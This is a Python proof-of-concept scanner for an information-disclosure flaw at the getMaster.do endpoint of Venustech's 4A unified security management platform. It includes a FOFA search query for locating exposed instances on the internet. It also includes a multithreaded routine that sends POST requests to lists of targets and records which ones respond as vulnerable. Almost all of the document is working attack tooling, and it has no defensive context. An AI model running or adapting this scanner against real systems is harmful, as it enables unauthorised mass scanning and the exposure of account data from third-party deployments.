# 启明星辰 4A统一安全管控平台 getMaster.do 信息泄漏漏洞

#fofa语法：body="cas/css/ace-part2.min.css"     app="启明星辰-4A统一安全管控平台"

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """ 

             _   __  __           _               _       
            | | |  \/  |         | |             | |      
   __ _  ___| |_| \  / | __ _ ___| |_ ___ _ __ __| | ___  
  / _` |/ _ \ __| |\/| |/ _` / __| __/ _ \ '__/ _` |/ _ \ 
 | (_| |  __/ |_| |  | | (_| \__ \ ||  __/ |_| (_| | (_) |
  \__, |\___|\__|_|  |_|\__,_|___/\__\___|_(_)\__,_|\___/ 
   __/ |                                                  
  |___/                                                                                                                                              
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="启明星辰 4A统一安全管控平台")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/accountApi/getMaster.do'
    url = target + url_payload
    header = {
        'Content-Type': 'application/json'
    }
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }
    try:
        res = requests.post(url=url,headers=header,verify=False)
        if res.status_code == 200:
            print(f"f[+]该url存在信息泄漏漏洞,url为{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target + "\n")
        else:
            print(f"[-]该url不存在信息泄漏漏洞,url为{target}")
    except Exception as e:
        print(f"该url出现问题,请手动测试url为{target}")
if __name__ == '__main__':
    main()